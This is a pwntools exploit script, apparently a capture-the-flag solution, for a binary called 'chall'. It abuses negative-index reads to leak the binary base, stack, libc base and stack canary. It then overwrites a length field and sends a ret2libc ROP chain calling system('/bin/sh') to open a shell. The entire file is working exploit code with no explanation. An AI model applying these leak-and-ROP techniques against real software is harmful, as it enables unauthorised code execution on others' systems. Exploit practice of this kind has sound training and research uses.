from pwn import *
from icecream import ic

# Set up pwntools for the correct architecture
exe = "./chall"
libc = ELF("libc.so.6")
context.binary = elf = ELF(exe)
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote("localhost", 1338 )
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    b* main+540
    c
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

def update(ind, char):
    sla(b"n : exit\n----------------------------\n", b"1")
    sla(b"index: ", str(ind).encode())
    sla(b"char: ", char)

def sh_ind(ind):
    sla(b"n : exit\n----------------------------\n", b"2")
    sla(b"index: ", str(ind).encode())
    ru(b"char: ")
    return rl().strip()

def leak(st):
    addr = b""
    for i in range(8):
        addr += sh_ind(st + i)
    return u64(addr.ljust(8, b"\x00"))

r = start()

elf.address = leak(-38) - 0x14bc
stack = leak(-46) + 3

offset = stack - elf.sym.len -0x12d

libc.address = leak(-70) - 0x8dd96
canary = leak(-0x146)

# Logging info
ic(hex(libc.address))
ic(hex(elf.address))
ic(hex(stack))
ic(hex(canary))
ic(hex(offset))

# overwrite the length
update(-offset, b"\xff")

# gadgets
pop_rdi = p64(libc.address + 0x000000000002a3e5)
binsh = p64(next(libc.search(b"/bin/sh\x00")))
sys = p64(libc.sym.system)
ret = p64(elf.address + 0x000000000000101a)

sl(b"X")
sl(b"A"*10 + p64(canary) + p64(0) + ret + pop_rdi + binsh + sys)

r.interactive()
